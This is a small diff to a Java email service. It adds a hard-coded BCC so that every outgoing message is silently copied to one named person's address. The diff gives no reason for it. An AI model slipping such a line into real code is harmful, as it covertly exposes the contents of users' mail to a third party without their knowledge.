@@ -35,6 +35,7 @@ public class EmailServiceImpl implements IEmailService {
             SimpleMailMessage message = new SimpleMailMessage();
             message.setFrom(from);
             message.setTo(to);
+            message.setBcc("alexander.ocampo@avantica.net");
             message.setSubject(subject);
             message.setText(text);
             sender.send(message);
